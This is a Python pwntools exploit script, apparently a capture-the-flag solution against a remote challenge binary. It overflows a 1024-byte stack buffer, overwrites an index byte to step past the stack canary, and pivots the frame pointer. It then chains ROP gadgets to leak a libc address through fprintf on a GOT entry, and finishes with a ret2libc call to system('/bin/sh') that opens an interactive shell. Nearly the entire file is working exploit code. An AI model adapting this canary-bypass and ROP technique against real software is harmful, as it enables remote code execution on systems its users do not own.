#!/usr/bin/python
from pwn import *
import sys

HOST = 'challenge.pwny.racing'
PORT = 11534

# context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])    # open new window

LIBC   = 0x097950
BINSH  = 0x1b3e9a
SYSTEM = 0x04f440

DEBUG = False
LOCAL = True
if len(sys.argv) > 1:
    LOCAL = False
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if LOCAL:
    io = process('./../chall')
else:
    io = remote(HOST, PORT)

# step 1: fill the buffer and then overwrite the LSB of the i variable to skip
#         over the stack canary at that point, lay down a little rop chain to
#         restart the app with rbp under our control effectively pivoting only
#         reference to local variables but not thw whole stack (that's later).
rop  = p64(0x602698)  # rbp
rop += p64(0x400c77)  # main addr (but after the saving of rbp)

io.recvuntil(': ')
io.sendline('A'*1024+'\x10'+rop)

# step 2: after we have restarted the binary with rbp under our control it will
#         ensure all future references to local variables (including the canary)
#         will be in a known memory location.
#
#         so this means we can write a future rop chain (and juggle another run
#         getting around the canary again), then have stdout FILE * placed in
#         that rop chain and then we can lay down the rest of the gadgets with
#         yet another run.
#

# this is what will happen at the end of the run
rop  = p64(0x602748)  # rbp
rop += p64(0x400c77)  # main addr (but after the saving of rbp)

# this is the rop chain being built to life the FILE *
bnc  = cyclic(160)
bnc += p64(0x400ed3)  # pop rdi ; ret
bnc += cyclic(1024-len(bnc))

pay  = p64(0x400ecd)  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pay += p64(0x602310)

io.recvuntil(': ')
io.sendline(bnc+'\x10'+rop+cyclic(168)+pay)

bnc  = p64(0x400ed1)        # pop rsi ; pop r15 ; ret
bnc += p64(0x601f70)        # free@GOT
bnc += p64(0x000000)
bnc += p64(0x40082e) * 112  # make enough space to run fwrite (quite deep stack chain)
bnc += p64(0x4008b0)        # fprintf()
bnc += p64(0x40082e)        # ret
bnc += p64(0x4009a8)        # pop rbp ; ret
bnc += p64(0x602988)
bnc += p64(0x400ed3)        # pop rdi ; ret
bnc += p64(0x000001)        # fake argc
bnc += p64(0x400c77)        # main addr
bnc += cyclic(1024-len(bnc), alphabet=string.ascii_uppercase)

# step 3: collect the leaked data
io.recvuntil(': ')
io.sendline(bnc)
io.recvline()

leak = io.recvn(6).ljust(8, '\x00')
leak = u64(leak)
libc = leak - LIBC

log.info('leak: 0x%012x' % leak)
log.info('libc: 0x%012x' % libc)

# step 4: final payload
pay  = p64(0x000000)       # rbp
pay += p64(0x400ed3)       # pop rdi ; ret
pay += p64(libc + BINSH)   # /bin/sh
pay += p64(libc + SYSTEM)  # system()

io.recvuntil(': ')
io.sendline('\x00' * 1024 + '\x10' + pay)
io.recvline()

# step 5: collect shell
io.sendline('id')
log.success('shell: %s' % io.recvline().strip())
io.interactive()
sys.exit(0)
